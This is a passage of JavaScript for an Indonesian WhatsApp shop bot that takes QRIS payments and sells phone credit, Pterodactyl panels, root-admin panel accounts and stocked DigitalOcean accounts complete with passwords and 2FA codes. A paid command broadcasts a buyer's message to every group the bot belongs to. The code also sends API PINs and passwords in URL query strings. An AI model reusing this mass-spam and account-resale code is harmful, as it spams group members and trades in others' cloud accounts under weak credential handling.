        let dana = data.filter(item => /Axis Transfer/.test(item.produk) && item.harga > 0)
            .sort((a, b) => a.harga - b.harga);
        let dana0 = data.filter(item => /Telkomsel Transfer/.test(item.produk) && item.harga > 0)
            .sort((a, b) => a.harga - b.harga);
        let dana1 = data.filter(item => /Smartfren Transfer/.test(item.produk) && item.harga > 0)
            .sort((a, b) => a.harga - b.harga);
        let dana2 = data.filter(item => /Three Transfer/.test(item.produk) && item.harga > 0)
            .sort((a, b) => a.harga - b.harga);
        let dana3 = data.filter(item => /XL Transfer/.test(item.produk) && item.harga > 0)
            .sort((a, b) => a.harga - b.harga);   
 dana = [...dana, ...dana0, ...dana1, ...dana2, ...dana3]

        let sections = dana.map((item) => {
            const status = item.status === "1" ? "✅" : "❌";
            return {
                title: `${item.keterangan}`,
                description: `Rp${item.harga}`, 
                id: `.isipulsa ${nodana} ${item.kode}|${item.harga}|${item.keterangan}`
            };
})
return conn.sendMessage(m.chat, {
  buttons: [
    {
    buttonId: 'action',
    buttonText: { displayText: 'ini pesan interactiveMeta' },
    type: 4,
    nativeFlowInfo: {
        name: 'single_select',
        paramsJson: JSON.stringify({
          title: 'Pilih Jumlah',
          sections: [
            {
              title: 'List Layanan Isi Pulsa',
              highlight_label: 'Recommended',
              rows: sections             
            }
          ]
        })
      }
      }
  ],
  footer: `© メミＸＹ𝕮𝖔𝖔𝖑𝔠𝔯𝔞𝔣𝔱ミ⁠メ || XYTeam Shop ID`,
  headerType: 1,
  viewOnce: true,
  text: "Pilih Nominal Isi Pulsa\n",
  contextInfo: {
   isForwarded: true, 
   mentionedJid: [m.sender, global.owner+"@s.whatsapp.net"], 
  },
}, {quoted: m}) 
}
let Obj = {}
Obj.harga = args[1].split("|")[1]
Obj.nominal = args[1].split("|")[2]
Obj.kode = args[1].split("|")[0]
Obj.nodana = args[0].trim()
const UrlQr = global.qrisOrderKuota
const amount  = Number(Obj.harga) + generateRandomNumber(110, 250)

const get = await axios.get(`https://restapi-v2.simplebot.my.id/orderkuota/createpayment?apikey=${global.apiSimpleBot}&amount=${amount}&codeqr=${UrlQr}`)

const teks3 = `
*── INFORMASI PEMBAYARAN*
  
 *• ID :* ${get.data.result.idtransaksi}
 *• Total Pembayaran :* Rp${await toIDR(get.data.result.jumlah)}
 *• Barang :* ${Obj.nominal}
 *• Expired :* 5 menit

*Note :* 
Qris pembayaran hanya berlaku dalam 5 menit, jika sudah melewati 5 menit pembayaran dinyatakan tidak valid!
Jika pembayaran berhasil bot akan otomatis mengirim notifikasi status pembayaran kamu.
`
let msgQr = await conn.sendMessage(m.chat, {
  footer: `© メミＸＹ𝕮𝖔𝖔𝖑𝔠𝔯𝔞𝔣𝔱ミ⁠メ || XYTeam Shop ID`,
  buttons: [
    {
      buttonId: `.batalbeli`,
      buttonText: { displayText: 'Batalkan Pembelian' },
      type: 1
    }
  ],
  headerType: 1,
  viewOnce: true,
  image: {url: get.data.result.imageqris.url}, 
  caption: teks3,
  contextInfo: {
   mentionedJid: [m.sender]
  },
})
db.users[m.sender].status_deposit = true
db.users[m.sender].saweria = {
msg: msgQr, 
keterangan: Obj.nominal, 
chat: m.sender,
idDeposit: get.data.result.idtransaksi, 
amount: get.data.result.jumlah.toString(), 
exp: function () {
setTimeout(async () => {
if (db.users[m.sender].status_deposit == true && db.users[m.sender].saweria && db.users[m.sender].saweria.amount == db.users[m.sender].saweria.amount) {
await conn.sendMessage(db.users[m.sender].saweria.chat, {text: "QRIS Pembayaran telah expired!"}, {quoted: db.users[m.sender].saweria.msg})
await conn.sendMessage(db.users[m.sender].saweria.chat, { delete: db.users[m.sender].saweria.msg.key })
db.users[m.sender].status_deposit = false
await clearInterval(db.users[m.sender].saweria.exp)
delete db.users[m.sender].saweria
}
}, 300000)
}
}

await db.users[m.sender].saweria.exp()

while (db.users[m.sender].status_deposit == true && db.users[m.sender].saweria && db.users[m.sender].saweria.amount) {
await sleep(8000)
const resultcek = await axios.get(`https://restapi-v2.simplebot.my.id/orderkuota/cekstatus?apikey=${global.apiSimpleBot}&merchant=${global.merchantIdOrderKuota}&keyorkut=${global.apiOrderKuota}`)
const req = await resultcek.data
if (db.users[m.sender].saweria && req?.result?.amount == db.users[m.sender].saweria.amount) {
db.users[m.sender].status_deposit = false
await clearInterval(db.users[m.sender].saweria.exp)
await conn.sendMessage(db.users[m.sender].saweria.chat, {text: `
*PEMBAYARAN BERHASIL DITERIMA ✅*

 *• ID :* ${db.users[m.sender].saweria.idDeposit}
 *• Total Pembayaran :* Rp${await toIDR(db.users[m.sender].saweria.amount)}
 *• Barang :* ${Obj.nominal}
`}, {quoted: db.users[m.sender].saweria.msg})
const idtrx = "ZarStore" + `${Date.now()}`
await fetchJson(`https://h2h.okeconnect.com/trx?memberID=${global.merchantIdOrderKuota}&product=${Obj.kode}&dest=${Obj.nodana}&refID=&pin=${global.pinH2H}&password=${global.passwordH2H}`)
let statuse = true
while (statuse) {
let dt = await fetchJson(`https://h2h.okeconnect.com/trx?memberID=${global.merchantIdOrderKuota}&product=${Obj.kode}&dest=${Obj.nodana}&refID=&pin=${global.pinH2H}&password=${global.passwordH2H}`)
if (/status Sukses/.test(dt)) {
await conn.sendMessage(db.users[m.sender].saweria.chat, {text: `
*Topup ${db.users[m.sender].saweria.keterangan} Berhasil ✅*

 *• Nomor Tujuan :* ${Obj.nodana}
 *• Status :* Sukses
`}, {quoted: db.users[m.sender].saweria.msg})
statuse = false
break
}
await sleep(5000)
}
await conn.sendMessage(db.users[m.sender].saweria.chat, { delete: db.users[m.sender].saweria.msg.key })
delete db.users[m.sender].saweria
}
}

}
break

//~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~//

case "buypanel": {
if (m.isGroup) return m.reply("Pembelian panel pterodactyl hanya bisa di dalam private chat")
if (db.users[m.sender].status_deposit) return m.reply("Masih ada transaksi yang belum diselesaikan, ketik *.batalbeli* untuk membatalkan transaksi sebelumnya!")
if (!text) return conn.sendMessage(m.chat, {
  buttons: [
    {
    buttonId: 'action',
    buttonText: { displayText: 'ini pesan interactiveMeta' },
    type: 4,
    nativeFlowInfo: {
        name: 'single_select',
        paramsJson: JSON.stringify({
          title: 'Pilih Ram Panel',
          sections: [
            {
              title: 'List Ram Server Panel',
              highlight_label: 'Recommended',
              rows: [
                {
                  title: 'Ram Unlimited', 
                  description: "Rp1.000", 
                  id: '.buypanel unlimited'
                },
                {
                  title: 'Ram 1GB', 
                  description: "Rp500", 
                  id: '.buypanel 1gb'
                },
                {
                  title: 'Ram 2GB', 
                  description: "Rp1000", 
                  id: '.buypanel 2gb'
                },
                {
                  title: 'Ram 3GB', 
                  description: "Rp2000", 
                  id: '.buypanel 3gb'
                },
                {
                  title: 'Ram 4GB', 
                  description: "Rp3000", 
                  id: '.buypanel 4gb'
                },      
                {
                  title: 'Ram 5GB', 
                  description: "Rp4000", 
                  id: '.buypanel 5gb'
                },       
                {
                  title: 'Ram 6GB', 
                  description: "Rp5000", 
                  id: '.buypanel 6gb'
                },
                {
                  title: 'Ram 7GB', 
                  description: "Rp6000", 
                  id: '.buypanel 7gb'
                },        
                {
                  title: 'Ram 8GB', 
                  description: "Rp7000", 
                  id: '.buypanel 8gb'
                },   
                {
                  title: 'Ram 9GB', 
                  description: "Rp8000", 
                  id: '.buypanel 9gb'
                },       
                {
                  title: 'Ram 10GB', 
                  description: "Rp9000", 
                  id: '.buypanel 10gb'
                },                                       
              ]
            }
          ]
        })
      }
      }
  ],
  footer: `© メミＸＹ𝕮𝖔𝖔𝖑𝔠𝔯𝔞𝔣𝔱ミ⁠メ || XYTeam Shop ID`,
  headerType: 1,
  viewOnce: true,
  text: "Pilih Ram Server Panel Yang Tersedia\n",
  contextInfo: {
   isForwarded: true, 
   mentionedJid: [m.sender, global.owner+"@s.whatsapp.net"], 
  },
}, {quoted: m})
let Obj = {}
let cmd = text.toLowerCase()
if (cmd == "1gb") {
Obj.ram = "1500"
Obj.disk = "0"
Obj.cpu = "100"
Obj.harga = "500"
} else if (cmd == "2gb") {
Obj.ram = "2500"
Obj.disk = "0"
Obj.cpu = "200"
Obj.harga = "1000"
} else if (cmd == "3gb") {
Obj.ram = "3500"
Obj.disk = "0"
Obj.cpu = "300"
Obj.harga = "2000"
} else if (cmd == "4gb") {
Obj.ram = "4500"
Obj.disk = "0"
Obj.cpu = "400"
Obj.harga = "3000"
} else if (cmd == "5gb") {
Obj.ram = "5500"
Obj.disk = "0"
Obj.cpu = "500"
Obj.harga = "4000"
} else if (cmd == "6gb") {
Obj.ram = "6500"
Obj.disk = "0"
Obj.cpu = "600"
Obj.harga = "5000"
} else if (cmd == "7gb") {
Obj.ram = "7500"
Obj.disk = "0"
Obj.cpu = "700"
Obj.harga = "6000"
} else if (cmd == "8gb") {
Obj.ram = "8500"
Obj.disk = "0"
Obj.cpu = "900"
Obj.harga = "7000"
} else if (cmd == "9gb") {
Obj.ram = "9500"
Obj.disk = "0"
Obj.cpu = "900"
Obj.harga = "8000"
} else if (cmd == "10gb") {
Obj.ram = "15000"
Obj.disk = "0"
Obj.cpu = "10000"
Obj.harga = "9000"
} else if (cmd == "unli" || cmd == "unlimited") {
Obj.ram = "0"
Obj.disk = "0"
Obj.cpu = "0"
Obj.harga = "10000"
} else return m.reply(teks)

const UrlQr = global.qrisOrderKuota

const amount  = Number(Obj.harga) + generateRandomNumber(110, 250)

const get = await axios.get(`https://restapi-v2.simplebot.my.id/orderkuota/createpayment?apikey=${global.apiSimpleBot}&amount=${amount}&codeqr=${UrlQr}`)

const teks3 = `
*── INFORMASI PEMBAYARAN*
  
 *• ID :* ${get.data.result.idtransaksi}
 *• Total Pembayaran :* Rp${await toIDR(get.data.result.jumlah)}
 *• Barang :* Panel Pterodactyl
 *• Expired :* 5 menit

*Note :* 
Qris pembayaran hanya berlaku dalam 5 menit, jika sudah melewati 5 menit pembayaran dinyatakan tidak valid!
Jika pembayaran berhasil bot akan otomatis mengirim notifikasi status pembayaran kamu.
`
let msgQr = await conn.sendMessage(m.chat, {
  footer: `© メミＸＹ𝕮𝖔𝖔𝖑𝔠𝔯𝔞𝔣𝔱ミ⁠メ || XYTeam Shop ID`,
  buttons: [
    {
      buttonId: `.batalbeli`,
      buttonText: { displayText: 'Batalkan Pembelian' },
      type: 1
    }
  ],
  headerType: 1,
  viewOnce: true,
  image: {url: get.data.result.imageqris.url}, 
  caption: teks3,
  contextInfo: {
   mentionedJid: [m.sender]
  },
})
db.users[m.sender].status_deposit = true
db.users[m.sender].saweria = {
msg: msgQr, 
chat: m.sender,
idDeposit: get.data.result.idtransaksi, 
amount: get.data.result.jumlah.toString(), 
exp: function () {
setTimeout(async () => {
if (db.users[m.sender].status_deposit == true && db.users[m.sender].saweria && db.users[m.sender].saweria.amount == db.users[m.sender].saweria.amount) {
await conn.sendMessage(db.users[m.sender].saweria.chat, {text: "QRIS Pembayaran telah expired!"}, {quoted: db.users[m.sender].saweria.msg})
await conn.sendMessage(db.users[m.sender].saweria.chat, { delete: db.users[m.sender].saweria.msg.key })
db.users[m.sender].status_deposit = false
await clearInterval(db.users[m.sender].saweria.exp)
delete db.users[m.sender].saweria
}
}, 300000)
}
}

await db.users[m.sender].saweria.exp()

while (db.users[m.sender].status_deposit == true && db.users[m.sender].saweria && db.users[m.sender].saweria.amount) {
await sleep(8000)
const resultcek = await axios.get(`https://restapi-v2.simplebot.my.id/orderkuota/cekstatus?apikey=${global.apiSimpleBot}&merchant=${global.merchantIdOrderKuota}&keyorkut=${global.apiOrderKuota}`)
const req = await resultcek.data
if (db.users[m.sender].saweria && req?.result?.amount == db.users[m.sender].saweria.amount) {
db.users[m.sender].status_deposit = false
await clearInterval(db.users[m.sender].saweria.exp)
await conn.sendMessage(db.users[m.sender].saweria.chat, {text: `
*PEMBAYARAN BERHASIL DITERIMA ✅*

 *• ID :* ${db.users[m.sender].saweria.idDeposit}
 *• Total Pembayaran :* Rp${await toIDR(db.users[m.sender].saweria.amount)}
 *• Barang :* Panel Pterodactyl
`}, {quoted: db.users[m.sender].saweria.msg})
let username = crypto.randomBytes(4).toString('hex')
let email = username+"@gmail.com"
let name = capital(username) + " Server"
let password = username+crypto.randomBytes(2).toString('hex')
let f = await fetch(domain + "/api/application/users", {
"method": "POST",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikey
},
"body": JSON.stringify({
"email": email,
"username": username.toLowerCase(),
"first_name": name,
"last_name": "Server",
"language": "en",
"password": password.toString()
})
})
let data = await f.json();
if (data.errors) return m.reply(JSON.stringify(data.errors[0], null, 2))
let user = data.attributes
let desc = tanggal(Date.now())
let usr_id = user.id
let f1 = await fetch(domain + `/api/application/nests/${nestid}/eggs/` + egg, {
"method": "GET",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikey
}
})
let data2 = await f1.json();
let startup_cmd = data2.attributes.startup
let f2 = await fetch(domain + "/api/application/servers", {
"method": "POST",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikey,
},
"body": JSON.stringify({
"name": name,
"description": desc,
"user": usr_id,
"egg": parseInt(egg),
"docker_image": "ghcr.io/parkervcp/yolks:nodejs_18",
"startup": startup_cmd,
"environment": {
"INST": "npm",
"USER_UPLOAD": "0",
"AUTO_UPDATE": "0",
"CMD_RUN": "npm start"
},
"limits": {
"memory": Obj.ram,
"swap": 0,
"disk": Obj.disk,
"io": 500,
"cpu": Obj.cpu
},
"feature_limits": {
"databases": 5,
"backups": 5,
"allocations": 5
},
deploy: {
locations: [parseInt(loc)],
dedicated_ip: false,
port_range: [],
},
})
})
let result = await f2.json()
if (result.errors) return m.reply(JSON.stringify(result.errors[0], null, 2))
let server = result.attributes
var orang = db.users[m.sender].saweria.chat
var tekspanel = `*Data Akun Panel Kamu 📦*

*📡 ID Server (${server.id})* 
*👤 Username :* ${user.username}
*🔐 Password :* ${password}
*🗓️ Created :* ${user.created_at.split("T")[0]}

*🌐 Spesifikasi Server*
* Ram : *${Obj.ram == "0" ? "Unlimited" : Obj.ram.split("").length > 4 ? Obj.ram.split("").slice(0,2).join("") + "GB" : Obj.ram.charAt(0) + "GB"}*
* Disk : *${Obj.disk == "0" ? "Unlimited" : Obj.disk.split("").length > 4 ? Obj.disk.split("").slice(0,2).join("") + "GB" : Obj.disk.charAt(0) + "GB"}*
* CPU : *${Obj.cpu == "0" ? "Unlimited" : Obj.cpu+"%"}*
* ${global.domain}

*Syarat & Ketentuan :*
* Simpan data ini sebaik mungkin
* Garansi pembelian 30 hari (∞x replace)
* Claim garansi wajib membawa bukti chat pembelian
`
await fs.writeFileSync("./akunpanel.txt", tekspanel)
await conn.sendMessage(orang, {document: fs.readFileSync("./akunpanel.txt"), fileName: "akunpanel.txt", mimetype: "text/plain", caption: tekspanel}, {quoted: null})
await fs.unlinkSync("./akunpanel.txt")
await conn.sendMessage(db.users[m.sender].saweria.chat, { delete: db.users[m.sender].saweria.msg.key })
delete db.users[m.sender].saweria
}
}

}
break

case "buyadp": {
if (m.isGroup) return m.reply("Pembelian panel pterodactyl hanya bisa di dalam private chat")
if (db.users[m.sender].status_deposit) return m.reply("Masih ada transaksi yang belum diselesaikan, ketik *.batalbeli* untuk membatalkan transaksi sebelumnya!")
let us = crypto.randomBytes(4).toString('hex')
let Obj = {}
Obj.harga = "20000" 
Obj.username = us
const UrlQr = global.qrisOrderKuota

const amount  = Number(Obj.harga) + generateRandomNumber(110, 250)
const get = await axios.get(`https://restapi-v2.simplebot.my.id/orderkuota/createpayment?apikey=${global.apiSimpleBot}&amount=${amount}&codeqr=${UrlQr}`)
const teks3 = `
*── INFORMASI PEMBAYARAN*
  
 *• ID :* ${get.data.result.idtransaksi}
 *• Total Pembayaran :* Rp${await toIDR(get.data.result.jumlah)}
 *• Barang :* Admin Panel Pterodactyl
 *• Expired :* 5 menit

*Note :* 
Qris pembayaran hanya berlaku dalam 5 menit, jika sudah melewati 5 menit pembayaran dinyatakan tidak valid!
Jika pembayaran berhasil bot akan otomatis mengirim notifikasi status pembayaran kamu.

Ketik *.batalbeli* untuk membatalkan
`
let msgQr = await conn.sendMessage(m.chat, {
  footer: `© メミＸＹ𝕮𝖔𝖔𝖑𝔠𝔯𝔞𝔣𝔱ミ⁠メ || XYTeam Shop ID`,
  buttons: [
    {
      buttonId: `.batalbeli`,
      buttonText: { displayText: 'Batalkan Pembelian' },
      type: 1
    }
  ],
  headerType: 1,
  viewOnce: true,
  image: {url: get.data.result.imageqris.url}, 
  caption: teks3,
  contextInfo: {
   mentionedJid: [m.sender]
  },
})
db.users[m.sender].status_deposit = true
db.users[m.sender].saweria = {
msg: msgQr, 
chat: m.sender,
idDeposit: get.data.result.idtransaksi, 
amount: get.data.result.jumlah.toString(), 
exp: function () {
setTimeout(async () => {
if (db.users[m.sender].status_deposit == true && db.users[m.sender].saweria && db.users[m.sender].saweria.amount == db.users[m.sender].saweria.amount) {
await conn.sendMessage(db.users[m.sender].saweria.chat, {text: "QRIS Pembayaran telah expired!"}, {quoted: db.users[m.sender].saweria.msg})
await conn.sendMessage(db.users[m.sender].saweria.chat, { delete: db.users[m.sender].saweria.msg.key })
db.users[m.sender].status_deposit = false
await clearInterval(db.users[m.sender].saweria.exp)
delete db.users[m.sender].saweria
}
}, 300000)
}
}

await db.users[m.sender].saweria.exp()

while (db.users[m.sender].status_deposit == true && db.users[m.sender].saweria && db.users[m.sender].saweria.amount) {
await sleep(8000)
const resultcek = await axios.get(`https://restapi-v2.simplebot.my.id/orderkuota/cekstatus?apikey=${global.apiSimpleBot}&merchant=${global.merchantIdOrderKuota}&keyorkut=${global.apiOrderKuota}`)
const req = await resultcek.data
if (db.users[m.sender].saweria && req?.result?.amount == db.users[m.sender].saweria.amount) {
db.users[m.sender].status_deposit = false
await clearInterval(db.users[m.sender].saweria.exp)
await conn.sendMessage(db.users[m.sender].saweria.chat, {text: `
*PEMBAYARAN BERHASIL DITERIMA ✅*

 *• ID :* ${db.users[m.sender].saweria.idDeposit}
 *• Total Pembayaran :* Rp${await toIDR(db.users[m.sender].saweria.amount)}
 *• Barang :* Admin Panel Pterodactyl
`}, {quoted: db.users[m.sender].saweria.msg})
let username = Obj.username
let email = username+"@gmail.com"
let name = capital(username)
let password = crypto.randomBytes(4).toString('hex')
let f = await fetch(domain + "/api/application/users", {
"method": "POST",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikey
},
"body": JSON.stringify({
"email": email,
"username": username.toLowerCase(),
"first_name": name,
"last_name": "Admin",
"root_admin": true,
"language": "en",
"password": password.toString()
})
})
let data = await f.json();
if (data.errors) return m.reply(JSON.stringify(data.errors[0], null, 2))
let user = data.attributes
var teks = `*Data Akun Admin Panel 📦*

*📡 ID User (${user.id})* 
*👤 Username :* ${user.username}
*🔐 Password :* ${password.toString()}
*🗓️ Created :* ${user.created_at.split("T")[0]}
* ${global.domain}

*Syarat & Ketentuan :*
* Simpan data ini sebaik mungkin
* Jangan asal hapus server!
* Ketahuan maling sc, auto delete akun no reff!
`
await fs.writeFileSync("./akunpanel.txt", teks)
await conn.sendMessage(db.users[m.sender].saweria.chat, {document: fs.readFileSync("./akunpanel.txt"), fileName: "akunpanel.txt", mimetype: "text/plain", caption: teks}, {quoted: m})
await fs.unlinkSync("./akunpanel.txt")
await conn.sendMessage(db.users[m.sender].saweria.chat, { delete: db.users[m.sender].saweria.msg.key })
delete db.users[m.sender].saweria
}
}

}
break

//~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~//

case "buyjasajpm": case "jasajpm": {
if (m.isGroup) return m.reply("Pembelian jasa jpm hanya bisa di dalam private chat")
if (db.users[m.sender].status_deposit) return m.reply("Masih ada transaksi yang belum diselesaikan, ketik *.batalbeli* untuk membatalkan transaksi sebelumnya!")
const tgc = await conn.groupFetchAllParticipating()
let totalgrup = await Object.keys(tgc)
if (!text) return m.reply(example(`teksnya bisa dengan kirim foto juga\n\n*Total Grup :* ${totalgrup.length} Grup chat\n*Harga :* Rp10.000`))
let Obj = {}
Obj.harga = "10000"
Obj.pesan = text
if (/image/.test(mime)) Obj.img = qmsg
const UrlQr = global.qrisOrderKuota

const amount  = Number(Obj.harga) + generateRandomNumber(110, 250)
const get = await axios.get(`https://restapi-v2.simplebot.my.id/orderkuota/createpayment?apikey=${global.apiSimpleBot}&amount=${amount}&codeqr=${UrlQr}`)
const teks3 = `
*── INFORMASI PEMBAYARAN*
  
 *• ID :* ${get.data.result.idtransaksi}
 *• Total Pembayaran :* Rp${await toIDR(get.data.result.jumlah)}
 *• Barang :* Jasa Jpm Pesan
 *• Expired :* 5 menit

*Note :* 
Qris pembayaran hanya berlaku dalam 5 menit, jika sudah melewati 5 menit pembayaran dinyatakan tidak valid!
Jika pembayaran berhasil bot akan otomatis mengirim notifikasi status pembayaran kamu.

Ketik *.batalbeli* untuk membatalkan
`
let msgQr = await conn.sendMessage(m.chat, {
  footer: `© メミＸＹ𝕮𝖔𝖔𝖑𝔠𝔯𝔞𝔣𝔱ミ⁠メ || XYTeam Shop ID`,
  buttons: [
    {
      buttonId: `.batalbeli`,
      buttonText: { displayText: 'Batalkan Pembelian' },
      type: 1
    }
  ],
  headerType: 1,
  viewOnce: true,
  image: {url: get.data.result.imageqris.url}, 
  caption: teks3,
  contextInfo: {
   mentionedJid: [m.sender]
  },
})
db.users[m.sender].status_deposit = true
db.users[m.sender].saweria = {
msg: msgQr, 
chat: m.sender,
idDeposit: get.data.result.idtransaksi, 
amount: get.data.result.jumlah.toString(), 
exp: function () {
setTimeout(async () => {
if (db.users[m.sender].status_deposit == true && db.users[m.sender].saweria && db.users[m.sender].saweria.amount == db.users[m.sender].saweria.amount) {
await conn.sendMessage(db.users[m.sender].saweria.chat, {text: "QRIS Pembayaran telah expired!"}, {quoted: db.users[m.sender].saweria.msg})
await conn.sendMessage(db.users[m.sender].saweria.chat, { delete: db.users[m.sender].saweria.msg.key })
db.users[m.sender].status_deposit = false
await clearInterval(db.users[m.sender].saweria.exp)
delete db.users[m.sender].saweria
}
}, 300000)
}
}

await db.users[m.sender].saweria.exp()

while (db.users[m.sender].status_deposit == true && db.users[m.sender].saweria && db.users[m.sender].saweria.amount) {
await sleep(8000)
const resultcek = await axios.get(`https://restapi-v2.simplebot.my.id/orderkuota/cekstatus?apikey=${global.apiSimpleBot}&merchant=${global.merchantIdOrderKuota}&keyorkut=${global.apiOrderKuota}`)
const req = await resultcek.data
if (db.users[m.sender].saweria && req?.result?.amount == db.users[m.sender].saweria.amount) {
db.users[m.sender].status_deposit = false
await clearInterval(db.users[m.sender].saweria.exp)
await conn.sendMessage(db.users[m.sender].saweria.chat, {text: `
*PEMBAYARAN BERHASIL DITERIMA ✅*

 *• ID :* ${db.users[m.sender].saweria.idDeposit}
 *• Total Pembayaran :* Rp${await toIDR(db.users[m.sender].saweria.amount)}
 *• Barang :* Admin Panel Pterodactyl
`}, {quoted: db.users[m.sender].saweria.msg})

let rest
if (Obj.img !== undefined) {
rest = await conn.downloadAndSaveMediaMessage(Obj.img)
}
const allgrup = await conn.groupFetchAllParticipating()
const res = await Object.keys(allgrup)
let count = 0
const ttks = Obj.pesan
const pesancoy = rest !== undefined ? { image: await fs.readFileSync(rest), caption: ttks } : { text: ttks }
const opsijpm = rest !== undefined ? "teks & foto" : "teks"
const jid = m.chat
await m.reply(`Memproses jpm *${opsijpm}* ke ${res.length} grup chat`)
for (let i of res) {
if (global.db.groups[i] && global.db.groups[i].blacklistjpm && global.db.groups[i].blacklistjpm == true) continue
try {
await conn.sendMessage(i, pesancoy, {quoted: qlocJpm})
count += 1
} catch {}
await sleep(global.delayJpm)
}
if (rest !== undefined) await fs.unlinkSync(rest)
await conn.sendMessage(jid, {text: `Jpm *${opsijpm}* berhasil dikirim ke ${res.length} grup chat`}, {quoted: m})
await conn.sendMessage(db.users[m.sender].saweria.chat, { delete: db.users[m.sender].saweria.msg.key })
delete db.users[m.sender].saweria
}
}
}
break

//~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~//

case "buydo": case "buydigitalocean": {
if (stokdo.length < 1) return m.reply("Maaf stok do sedang tidak tersedia")
if (m.isGroup) return m.reply("Pembelian digitalocean hanya bisa di dalam private chat")
if (db.users[m.sender].status_deposit) return m.reply("Masih ada transaksi yang belum diselesaikan, ketik *.batalbeli* untuk membatalkan transaksi sebelumnya!")
if (!text) {
let butnya = []
let urutt = 0
for (let gg of stokdo) {
butnya.push({
title: `${gg.droplet} Droplet`, 
description: `Rp${await toIDR(gg.harga)}`, 
id: `.buydo ${urutt += 1}`
})
}
return conn.sendMessage(m.chat, {
  buttons: [
    {
    buttonId: 'action',
    buttonText: { displayText: 'ini pesan interactiveMeta' },
    type: 4,
    nativeFlowInfo: {
        name: 'single_select',
        paramsJson: JSON.stringify({
          title: 'Pilih Droplet',
          sections: [
            {
              title: 'List Stok Digitalocean',
              highlight_label: 'Recommended',
              rows: butnya
            }
          ]
        })
      }
      }
  ],
  footer: `© メミＸＹ𝕮𝖔𝖔𝖑𝔠𝔯𝔞𝔣𝔱ミ⁠メ || XYTeam Shop ID`,
  headerType: 1,
  viewOnce: true,
  text: "Pilih Stock Digitalocean\n",
  contextInfo: {
   isForwarded: true, 
   mentionedJid: [m.sender, global.owner+"@s.whatsapp.net"], 
  },
}, {quoted: m})
}

const donya = stokdo[Number(text) - 1]
let us = crypto.randomBytes(4).toString('hex')
let Obj = {}
Obj.harga = donya.harga
Obj.akun = donya
const UrlQr = global.qrisOrderKuota
const amount  = Number(Obj.harga) + generateRandomNumber(110, 250)
const get = await axios.get(`https://restapi-v2.simplebot.my.id/orderkuota/createpayment?apikey=${global.apiSimpleBot}&amount=${amount}&codeqr=${UrlQr}`)
const teks3 = `
*── INFORMASI PEMBAYARAN*
  
 *• ID :* ${get.data.result.idtransaksi}
 *• Total Pembayaran :* Rp${await toIDR(get.data.result.jumlah)}
 *• Barang :* Digitalocean ${donya.droplet} Drop
 *• Expired :* 5 menit

*Note :* 
Qris pembayaran hanya berlaku dalam 5 menit, jika sudah melewati 5 menit pembayaran dinyatakan tidak valid!
Jika pembayaran berhasil bot akan otomatis mengirim notifikasi status pembayaran kamu.

Ketik *.batalbeli* untuk membatalkan
`
let msgQr = await conn.sendMessage(m.chat, {
  footer: `© メミＸＹ𝕮𝖔𝖔𝖑𝔠𝔯𝔞𝔣𝔱ミ⁠メ || XYTeam Shop ID`,
  buttons: [
    {
      buttonId: `.batalbeli`,
      buttonText: { displayText: 'Batalkan Pembelian' },
      type: 1
    }
  ],
  headerType: 1,
  viewOnce: true,
  image: {url: get.data.result.imageqris.url}, 
  caption: teks3,
  contextInfo: {
   mentionedJid: [m.sender]
  },
})
db.users[m.sender].status_deposit = true
db.users[m.sender].saweria = {
msg: msgQr, 
chat: m.sender,
idDeposit: get.data.result.idtransaksi, 
amount: get.data.result.jumlah.toString(), 
exp: function () {
setTimeout(async () => {
if (db.users[m.sender].status_deposit == true && db.users[m.sender].saweria && db.users[m.sender].saweria.amount == db.users[m.sender].saweria.amount) {
await conn.sendMessage(db.users[m.sender].saweria.chat, {text: "QRIS Pembayaran telah expired!"}, {quoted: db.users[m.sender].saweria.msg})
await conn.sendMessage(db.users[m.sender].saweria.chat, { delete: db.users[m.sender].saweria.msg.key })
db.users[m.sender].status_deposit = false
await clearInterval(db.users[m.sender].saweria.exp)
delete db.users[m.sender].saweria
}
}, 300000)
}
}

await db.users[m.sender].saweria.exp()

while (db.users[m.sender].status_deposit == true && db.users[m.sender].saweria && db.users[m.sender].saweria.amount) {
await sleep(8000)
const resultcek = await axios.get(`https://restapi-v2.simplebot.my.id/orderkuota/cekstatus?apikey=${global.apiSimpleBot}&merchant=${global.merchantIdOrderKuota}&keyorkut=${global.apiOrderKuota}`)
const req = await resultcek.data
if (db.users[m.sender].saweria && req?.result?.amount == db.users[m.sender].saweria.amount) {
db.users[m.sender].status_deposit = false
await clearInterval(db.users[m.sender].saweria.exp)
await conn.sendMessage(db.users[m.sender].saweria.chat, {text: `
*PEMBAYARAN BERHASIL DITERIMA ✅*

 *• ID :* ${db.users[m.sender].saweria.idDeposit}
 *• Total Pembayaran :* Rp${await toIDR(db.users[m.sender].saweria.amount)}
 *• Barang :* Digitalocean ${Obj.akun.droplet} Droplet
`}, {quoted: db.users[m.sender].saweria.msg})
var teks = `*Data Akun Digitalocean 📦*

*💌 Email :* ${Obj.akun.email}
*🔐 Password :* ${Obj.akun.password}
*Kode 2FA :* ${Obj.akun.kode2fa}
*Droplet :* ${Obj.akun.droplet}

*Syarat & Ketentuan :*
* Simpan data ini sebaik mungkin
* Seller hanya mengirim 1 kali!
* Garansi akun aktif 30 day
`
await conn.sendMessage(db.users[m.sender].saweria.chat, {text: teks}, {quoted: m})
const position = stokdo.indexOf(Obj.akun)
stokdo.splice(position, 1)
await fs.writeFileSync("./library/database/stokdo.json", JSON.stringify(stokdo, null, 2))
await conn.sendMessage(db.users[m.sender].saweria.chat, { delete: db.users[m.sender].saweria.msg.key })
delete db.users[m.sender].saweria
}
}

}
break

//~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~//

case "batalbeli": {
if (m.isGroup) return
if (db.users[m.sender].status_deposit == false) return 
db.users[m.sender].status_deposit = false
if ('saweria' in db.users[m.sender]) {
await conn.sendMessage(m.chat, {text: "Berhasil membatalkan pembelian ✅"}, {quoted: db.users[m.sender].saweria.msg})
await conn.sendMessage(m.chat, { delete: db.users[m.sender].saweria.msg.key })
await clearInterval(db.users[m.sender].saweria.exp)
delete db.users[m.sender].saweria
} else {
return m.reply("Berhasil membatalkan pembelian ✅")
}
}
break

//~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~//

